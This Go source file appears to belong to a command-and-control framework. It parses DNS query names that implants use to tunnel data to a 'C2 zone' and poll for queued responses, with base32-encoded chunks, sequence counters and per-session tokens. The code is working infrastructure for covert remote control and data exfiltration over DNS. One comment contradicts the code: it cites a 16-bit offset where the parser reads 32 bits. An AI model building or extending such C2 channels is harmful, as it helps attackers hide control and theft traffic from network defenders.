package handlers

import (
	"encoding/hex"
	"errors"
	"strings"
)

// RFC 4648 base32: a-z2-7, lowercase, no padding
const base32Alphabet = "abcdefghijklmnopqrstuvwxyz234567"

var base32DecodeTable [256]int8

func init() {
	for i := range base32DecodeTable {
		base32DecodeTable[i] = -1
	}
	for i, c := range base32Alphabet {
		base32DecodeTable[c] = int8(i)
	}
}

// dnsBase32Decode decodes a lowercase RFC 4648 base32 string (no padding).
func dnsBase32Decode(s string) ([]byte, error) {
	s = strings.ToLower(s)
	n := len(s)
	if n == 0 {
		return nil, nil
	}

	out := make([]byte, n*5/8)
	buf := 0
	bits := 0
	idx := 0

	for _, c := range s {
		v := base32DecodeTable[byte(c)]
		if v < 0 {
			return nil, errors.New("invalid base32 character")
		}
		buf = (buf << 5) | int(v)
		bits += 5
		if bits >= 8 {
			bits -= 8
			if idx >= len(out) {
				return nil, errors.New("base32 decode overflow")
			}
			out[idx] = byte(buf >> bits)
			idx++
		}
	}

	return out[:idx], nil
}

// dnsParseUploadFqdn parses an uplink A-query FQDN.
//
// Format: <b32chunk>.<seq4><cid4><tot4>.<tok8>.<zone>
//   - b32chunk: RFC 4648 base32 encoded binary chunk (≤ 48 chars)
//   - seq4:     4 hex chars — 16-bit rolling packet sequence
//   - cid4:     4 hex chars — chunk index within packet (0-based, 0–65535)
//   - tot4:     4 hex chars — total chunk count for this packet (1–65535)
//   - tok8:     8 hex chars — opaque per-session token (derived from AES key, not agent ID)
//   - zone:     configured C2 zone domain
func dnsParseUploadFqdn(name, zone string) (chunk []byte, seq, cid, tot uint16, tok uint32, err error) {
	name = strings.TrimSuffix(name, ".")
	zone = strings.TrimSuffix(zone, ".")

	suffix := "." + strings.ToLower(zone)
	lname := strings.ToLower(name)
	if !strings.HasSuffix(lname, suffix) {
		err = errors.New("uplink fqdn: zone mismatch")
		return
	}
	name = name[:len(name)-len(suffix)]

	// Expected: <b32chunk> . <seq4><cid4><tot4> . <tok8>
	labels := strings.Split(name, ".")
	if len(labels) != 3 {
		err = errors.New("uplink fqdn: expected 3 labels before zone")
		return
	}

	chunk, err = dnsBase32Decode(labels[0])
	if err != nil {
		return
	}

	// metaLabel: seq4(4) + cid4(4) + tot4(4) = 12 hex chars
	// cid and tot are 2 bytes each so payloads up to 65535×30 ≈ 1.9 MB are supported
	// without the chunk counter wrapping (old 2-hex/1-byte encoding capped at 255 chunks).
	metaLabel := labels[1]
	if len(metaLabel) != 12 {
		err = errors.New("uplink fqdn: meta label must be 12 hex chars")
		return
	}
	var meta []byte
	meta, err = hex.DecodeString(metaLabel)
	if err != nil {
		return
	}
	seq = uint16(meta[0])<<8 | uint16(meta[1])
	cid = uint16(meta[2])<<8 | uint16(meta[3])
	tot = uint16(meta[4])<<8 | uint16(meta[5])

	// tok8: 8 hex chars — opaque session token
	tokLabel := labels[2]
	if len(tokLabel) != 8 {
		err = errors.New("uplink fqdn: token label must be 8 hex chars")
		return
	}
	var tokBytes []byte
	tokBytes, err = hex.DecodeString(tokLabel)
	if err != nil {
		return
	}
	tok = uint32(tokBytes[0]) | uint32(tokBytes[1])<<8 | uint32(tokBytes[2])<<16 | uint32(tokBytes[3])<<24
	return
}

// dnsParseDownlinkFqdn parses a downlink TXT-query FQDN.
//
// Format: p.<seq4>.<off8>.<tok8>.<zone>
//   - p:    literal prefix distinguishing downlink polls
//   - seq4: 4 hex chars — same sequence as the uplink that produced this response
//   - off8: 8 hex chars — byte offset into the queued response (DWORD; supports up to 4 GB)
//   - tok8: 8 hex chars — opaque per-session token matching the uplink
//   - zone: configured C2 zone domain
func dnsParseDownlinkFqdn(name, zone string) (seq uint16, offset uint32, tok uint32, err error) {
	name = strings.TrimSuffix(name, ".")
	zone = strings.TrimSuffix(zone, ".")

	suffix := "." + strings.ToLower(zone)
	lname := strings.ToLower(name)
	if !strings.HasSuffix(lname, suffix) {
		err = errors.New("downlink fqdn: zone mismatch")
		return
	}
	name = name[:len(name)-len(suffix)]

	// Expected: p . <seq4> . <off8> . <tok8>
	labels := strings.Split(name, ".")
	if len(labels) != 4 || labels[0] != "p" {
		err = errors.New("downlink fqdn: expected p.<seq4>.<off8>.<tok8> before zone")
		return
	}

	var b []byte

	if len(labels[1]) != 4 {
		err = errors.New("downlink fqdn: seq must be 4 hex chars")
		return
	}
	b, err = hex.DecodeString(labels[1])
	if err != nil {
		return
	}
	seq = uint16(b[0])<<8 | uint16(b[1])

	if len(labels[2]) != 8 {
		err = errors.New("downlink fqdn: offset must be 8 hex chars")
		return
	}
	b, err = hex.DecodeString(labels[2])
	if err != nil {
		return
	}
	offset = uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])

	if len(labels[3]) != 8 {
		err = errors.New("downlink fqdn: token must be 8 hex chars")
		return
	}
	var tokBytes []byte
	tokBytes, err = hex.DecodeString(labels[3])
	if err != nil {
		return
	}
	tok = uint32(tokBytes[0]) | uint32(tokBytes[1])<<8 | uint32(tokBytes[2])<<16 | uint32(tokBytes[3])<<24
	return
}

// dnsTXTChunkSize is the number of raw bytes served per TXT downlink poll.
// At step 189 and uint16 offset the maximum response size is ~12 MB (65535 * 189).
const dnsTXTChunkSize = 189
